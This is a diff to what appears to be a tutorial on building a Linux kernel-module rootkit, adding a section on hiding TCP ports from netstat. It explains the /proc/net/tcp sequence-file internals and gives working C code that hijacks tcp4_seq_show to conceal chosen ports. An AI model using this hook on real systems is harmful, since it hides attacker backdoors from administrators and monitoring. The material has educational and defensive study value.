@@ -694,11 +694,260 @@ static struct cloak_mod_ent cloak_mod_ent_array[MAX_CLOAK_MOD_COUNT];
 
 
 
+## 6. hide ports
+
+### kernel mechanisms
+
+​	The bash command *netstat* reads the sequence file */proc/net/tcp* (for ipv4) to get network related information from the kernel. The sequence file related functions are defined in *net/ipv4/tcp_ipv4.c*. The output we get from *netstat* is issued by *tcp4_seq_show()* function, which is the "show" function of the sequence file. The definition is as follows:
+
+```c
+static int tcp4_seq_show(struct seq_file *seq, void *v)
+{
+	struct tcp_iter_state *st;
+	struct sock *sk = v;
+
+	seq_setwidth(seq, TMPSZ - 1);
+	if (v == SEQ_START_TOKEN) {
+		seq_puts(seq, "  sl  local_address rem_address   st tx_queue "
+			   "rx_queue tr tm->when retrnsmt   uid  timeout "
+			   "inode");
+		goto out;
+	}
+	st = seq->private;
+
+	if (sk->sk_state == TCP_TIME_WAIT)
+		get_timewait4_sock(v, seq, st->num);
+	else if (sk->sk_state == TCP_NEW_SYN_RECV)
+		get_openreq4(v, seq, st->num);
+	else
+		get_tcp4_sock(v, seq, st->num);
+out:
+	seq_pad(seq, '\n');
+	return 0;
+}
+```
+
+​	When the sequence file */proc/net/tcp* is opened, this function is called during the iteration of each *sock* struct to print its information. The *tcp4_seq_show* is a member in
+
+```c
+static struct tcp_seq_afinfo tcp4_seq_afinfo = {
+	.name		= "tcp",
+	.family		= AF_INET,
+	.seq_fops	= &tcp_afinfo_seq_fops,
+	.seq_ops	= {
+		.show		= tcp4_seq_show,
+	},
+};
+
+static const struct file_operations tcp_afinfo_seq_fops = {
+	.owner   = THIS_MODULE,
+	.open    = tcp_seq_open,
+	.read    = seq_read,
+	.llseek  = seq_lseek,
+	.release = seq_release_net
+};
+```
+
+​	And this struct in referrenced when register the sequence file in
+
+```c
+static int __net_init tcp4_proc_init_net(struct net *net)
+{
+	return tcp_proc_register(net, &tcp4_seq_afinfo);
+}
+
+int tcp_proc_register(struct net *net, struct tcp_seq_afinfo *afinfo)
+{
+	int rc = 0;
+	struct proc_dir_entry *p;
+
+	afinfo->seq_ops.start		= tcp_seq_start;
+	afinfo->seq_ops.next		= tcp_seq_next;
+	afinfo->seq_ops.stop		= tcp_seq_stop;
+
+	p = proc_create_data(afinfo->name, S_IRUGO, net->proc_net,
+			     afinfo->seq_fops, afinfo);
+	if (!p)
+		rc = -ENOMEM;
+	return rc;
+}
+EXPORT_SYMBOL(tcp_proc_register);
+```
+
+​	In *tcp_proc_register()*, *proc_create_data()* is called and the *tcp4_seq_afinfo* is passed to it. The definition of *proc_create_data()* is as follows, in *fs/proc/generic.c*
+
+```c
+struct proc_dir_entry *proc_create_data(const char *name, umode_t mode,
+					struct proc_dir_entry *parent,
+					const struct file_operations *proc_fops,
+					void *data)
+{
+	struct proc_dir_entry *pde;
+	if ((mode & S_IFMT) == 0)
+		mode |= S_IFREG;
+
+	if (!S_ISREG(mode)) {
+		WARN_ON(1);	/* use proc_mkdir() */
+		return NULL;
+	}
+
+	BUG_ON(proc_fops == NULL);
+
+	if ((mode & S_IALLUGO) == 0)
+		mode |= S_IRUGO;
+	pde = __proc_create(&parent, name, mode, 1);
+	if (!pde)
+		goto out;
+	pde->proc_fops = proc_fops;
+	pde->data = data;
+	pde->proc_iops = &proc_file_inode_operations;
+	if (proc_register(parent, pde) < 0)
+		goto out_free;
+	return pde;
+out_free:
+	kfree(pde);
+out:
+	return NULL;
+}
+```
+
+​	Here, a new /proc entry is created, whose definition is as follows, in *fs/proc/internal.h*
+
+```c
+struct proc_dir_entry {
+	unsigned int low_ino;
+	umode_t mode;
+	nlink_t nlink;
+	kuid_t uid;
+	kgid_t gid;
+	loff_t size;
+	const struct inode_operations *proc_iops;
+	const struct file_operations *proc_fops;
+	struct proc_dir_entry *parent;
+	struct rb_root_cached subdir;
+	struct rb_node subdir_node;
+	void *data;
+	atomic_t count;		/* use count */
+	atomic_t in_use;	/* number of callers into module in progress; */
+			/* negative -> it's going away RSN */
+	struct completion *pde_unload_completion;
+	struct list_head pde_openers;	/* who did ->open, but not ->release */
+	spinlock_t pde_unload_lock; /* proc_fops checks and pde_users bumps */
+	u8 namelen;
+	char name[];
+} __randomize_layout;
+```
+
+​	And its *data* filed will be a pointer to *tcp4_seq_afinfo* struct. When this sequence file is opened, the control flows goes by
+
+```c
+proc_fops => tcp_afinfo_seq_fops->tcp_seq_open
+```
+
+​	It is a general sequence file open implementation, after opening the sequence file it iterates on each *sock* struct and calls the *tcp4_seq_show()* to output formatted information for them. 
+
+​	Remember when we call *proc_create_data* to set up the proc entry and passed an argument names *data*? It points to the struct *tcp4_seq_afinfo*, which holds pointer to *tcp4_seq_show* when the iteration goes on. This is important for later implementation of hook. If we want to hide a port, we can simply hijack this pointer, overwrite it our wrapper function. Let's take look at the implementation of *tcp4_seq_afinfo*.(roll up a little bit to find its definition)
+
+​	The second argument *v* is cast into a struct type *sock*, its definition is as follows, in *include/net/sock.h*
+
+```c
+struct sock {
+	/*
+	 * Now struct inet_timewait_sock also uses sock_common, so please just
+	 * don't add nothing before this first member (__sk_common) --acme
+	 */
+	struct sock_common	__sk_common;
+#define sk_node			__sk_common.skc_node
+#define sk_nulls_node		__sk_common.skc_nulls_node
+#define sk_refcnt		__sk_common.skc_refcnt
+#define sk_tx_queue_mapping	__sk_common.skc_tx_queue_mapping
+
+#define sk_dontcopy_begin	__sk_common.skc_dontcopy_begin
+#define sk_dontcopy_end		__sk_common.skc_dontcopy_end
+#define sk_hash			__sk_common.skc_hash
+#define sk_portpair		__sk_common.skc_portpair
+    
+    .....
+}
+```
+
+​	The struct starts with an embeded struct type *sock_common*, follows by a bunch of macro definitions. There is one trivial thing to be noted: the bunch of macro definitions allows us to access values in sock_common with no need to dereferrence it. Now let's find out what's in *sock_common* (definition also in *include/net/sock.h*)
+
+```c
+struct sock_common {
+	/* skc_daddr and skc_rcv_saddr must be grouped on a 8 bytes aligned
+	 * address on 64bit arches : cf INET_MATCH()
+	 */
+	union {
+		__addrpair	skc_addrpair;
+		struct {
+			__be32	skc_daddr;
+			__be32	skc_rcv_saddr;
+		};
+	};
+	union  {
+		unsigned int	skc_hash;
+		__u16		skc_u16hashes[2];
+	};
+	/* skc_dport && skc_num must be grouped as well */
+	union {
+		__portpair	skc_portpair;
+		struct {
+			__be16	skc_dport;
+			__u16	skc_num;
+		};
+	};
+
+	unsigned short		skc_family;
+	volatile unsigned char	skc_state;
+	unsigned char		skc_reuse:4;
+    
+    .....
+}
+```
+
+​	This reasonable to assume that the field *skc_num* stores the local port of a tcp connection. It is exactly what we want. Now we have all we need.
+
+### implementation
+
+​	So the idea here is simple: we hook the *tcp4_seq_show* function, cast the second argument *v* to *sock*, check it's *skc_num* to find out if we want to hide it. If so, directly return 0. Otherwise, we forward the request to the real *tcp4_seq_show*. 
+
+​	The implementation is as follows
+
+```c
+static int hack_tcp4_seq_show(struct seq_file *seq, void* v){
+    struct sock* sk = v;
+    if(v!=SEQ_START_TOKEN && is_port_cloaked(sk->sk_num)){
+        return 0;
+    }
+    return real_tcp4_seq_show(seq, v);
+}
+
+// hijack the seq_op->show pointer
+static int hook_tcp4_seq_show(void){
+    struct file* fp;
+    struct tcp_seq_afinfo* afinfo;
+    fp = filp_open("/proc/net/tcp", O_RDONLY, 0);
+    afinfo = (struct tcp_seq_afinfo*)PDE_DATA(fp->f_path.dentry->d_inode);
+    real_tcp4_seq_show = afinfo->seq_ops.show;
+    afinfo->seq_ops.show = hack_tcp4_seq_show;
+    filp_close(fp, 0);
+    return 1;
+}
+
+```
+
+​	There are altenative ways to hijack the seq_op->show pointer, the method here is a rather lightweight one. The *proc_dir_entry->data* for */proc/net/tcp* is a pointer to *tcp4_seq_afinfo*, which holds the pointer to *seq_op->show* ----- the funtion we will hijack. We have talked about it earlier. The macro *PDE_DATA* takes an *inode* pointer to a /proc file and returns us the value of its *data* field. So we open the */proc/net/tcp*, get its *tcp_seq_afinfo* struct and overwrite its *show* field with our function and it's done.
+
+​	Like the part in file hide there are also some auxilary functions and data structs to help with the port hiding, plus the unhook operation. I will skip them this time.
+
+​	This part of implementation and mechanisms are strongly related to the kernel sequence file mechanisms. It is an interface to help with the implementation of /proc files, and there is a documentation file in Linux source code names */Documentation/filesystems/seq_files.txt* which provides a simple explanation. I will cover it in anot
+
 
 
 # Reference
 
 1. [(nearly) Complete Linux Loadable Kernel Modules](http://www.ouah.org/LKM_HACKING.html#I.3.)
 2. [The Linux Kernel Module Programming Guide](https://tldp.org/LDP/lkmpg/2.6/html/lkmpg.html#AEN40)
-3. 
+3. [Linux kernel source code](https://elixir.bootlin.com/linux/v4.15/source)
 
